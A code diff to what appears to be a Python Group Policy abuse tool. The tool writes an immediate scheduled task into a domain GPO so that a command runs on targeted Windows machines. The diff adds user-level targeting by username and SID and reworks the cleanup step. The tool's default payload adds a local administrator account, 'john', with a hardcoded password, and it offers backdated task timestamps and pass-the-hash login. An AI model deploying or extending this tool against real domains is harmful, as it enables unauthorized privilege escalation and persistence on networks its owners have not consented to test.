@@ -30,10 +30,12 @@ parser.add_argument('-user', action='store_true', help='Set user GPO (Default: F
 parser.add_argument('-user-as-admin', action='store_true', help='Set user GPO but run as SYSTEM (Default: False, Computer GPO)')
 parser.add_argument('-taskname', action='store', help='Taskname to create. (Default: TASK_<random>)')
 parser.add_argument('-computername', action='store', help='Computer name to target in item-level targeting (NETBIOS Name)')
+parser.add_argument('-username', action='store', help='User to target in item-level targeting (DOMAIN\\username)')
+parser.add_argument('-usersid', action='store', help='SID of the item-level targeted user (required with -username)')
 parser.add_argument('-mod-date', action='store', help='Task modification date (Default: 30 days before)')
 parser.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
 parser.add_argument('-description', action='store', help='Task description (Default: Empty)')
-parser.add_argument('--cleanup', action='store_true', help='Delete the Immediate‑Task XML and roll back the GPO version')
+parser.add_argument('--cleanup', action='store_true', help='Delete ScheduledTasks.xml and increment the GPO version')
 parser.add_argument('-powershell', action='store_true', help='Use Powershell for command execution')
 parser.add_argument('-command', action='store',
                     help='Command to execute (Default: Add john:H4x00r123.. as local Administrator)')
@@ -59,6 +61,11 @@ if len(sys.argv) == 1:
     sys.exit(1)
 
 options = parser.parse_args()
+
+if options.username and not options.usersid:
+    parser.error('-usersid is required when -username is specified')
+if options.usersid and not options.username:
+    parser.error('-username is required when -usersid is specified')
 
 if not options.gpo_id:
     parser.print_help()
@@ -159,16 +166,19 @@ try:
         sys.exit(0)
 
     if options.cleanup:
+        gpo_type = "user-as-admin" if options.user_as_admin else ("user" if options.user else "computer")
         ok = gpo.rollback_scheduled_task(
                 domain=domain,
                 gpo_id=options.gpo_id,
-                gpo_type=("user-as-admin" if getattr(options, "user_as_admin", False) else ("user" if options.user else "computer")))
-        if ok:
-            sys.exit(0)
-            logging.info("cleanup successful")
-        else:
-            logging.error("Error while updating versions")
+                gpo_type=gpo_type)
+        if not ok:
+            logging.error("Could not delete ScheduledTasks.xml")
             sys.exit(1)
+        if not gpo.update_versions(url, domain, options.gpo_id, gpo_type=gpo_type, cleanup=True):
+            logging.error("ScheduledTasks.xml was deleted, but the GPO version update failed")
+            sys.exit(1)
+        logging.info("Cleanup successful; GPO version updated")
+        sys.exit(0)
 
 
     task_name = gpo.update_scheduled_task(
@@ -181,6 +191,8 @@ try:
         command=options.command,
         gpo_type=("user-as-admin" if getattr(options, "user_as_admin", False) else ("user" if options.user else "computer")),
         computername=options.computername,
+        username=options.username,
+        usersid=options.usersid,
         force=options.f
     )
     if task_name:
